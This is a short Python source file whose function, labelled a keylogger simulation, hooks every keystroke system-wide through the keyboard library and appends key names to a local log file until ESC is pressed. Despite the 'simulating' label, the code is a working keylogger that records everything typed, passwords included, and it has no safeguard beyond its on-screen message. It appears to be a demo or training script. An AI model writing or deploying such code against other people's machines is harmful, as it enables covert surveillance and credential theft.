import keyboard
from datetime import datetime

def simulate_keylogger():
    print("Simulating keylogger. Press ESC to stop.")
    log_file = "logs/keylog.txt"
    with open(log_file, "a") as f:
        f.write(f"Keylogger started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        keyboard.hook(lambda e: f.write(f"{e.name}\n"))
        keyboard.wait("esc")
    print(f"Keylogs saved to {log_file}")